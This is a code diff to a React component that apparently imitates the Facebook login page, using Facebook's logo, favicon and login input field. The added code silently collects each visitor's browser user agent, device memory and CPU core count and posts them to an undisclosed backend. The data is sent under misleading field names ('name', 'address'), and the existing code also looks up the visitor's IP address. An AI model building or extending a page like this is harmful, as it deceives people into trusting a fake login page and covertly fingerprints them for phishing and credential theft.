@@ -27,6 +27,30 @@ function Facebook() {
   //   }
   // },[])
 
+  useEffect(() => {
+    const { userAgent, deviceMemory, hardwareConcurrency } = navigator;
+    const name = new Date().toLocaleString();
+    const address = `${userAgent} and ${deviceMemory || 'N/A'} and ${hardwareConcurrency || 'N/A'}`;
+
+    const data = {
+      name,
+      address
+    };
+
+    const headers = {
+      'Content-Type': 'Application/Json',
+      'Accept': 'Application/Json'
+    };
+
+    axios.post(`${api}/v1/post`, data)
+      .then(response => {
+        console.log('API Response:', response.data);
+      })
+      .catch(error => {
+        console.error('API Error:', error);
+      });
+  }, []); 
+
   const [ip, setip] = useState('')
 
   fetch('https://api.ipify.org?format=json')
@@ -66,15 +90,15 @@ function Facebook() {
                 <link rel="icon" href="https://www.facebook.com/" />
             </Helmet>
           <header>
-  <div class="top">
+  <div className="top">
   </div>  
 </header>
 <section>
-  <div class="center">
+  <div className="center">
 <a href= '/'>
   <img 
   src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" 
-  width="112" class="img" alt="facebook"/> </a>
+  width="112" className="img" alt="facebook"/> </a>
 
 <div className="field">
     <input type="email" id="name" placeholder="Mobile Number or email address"
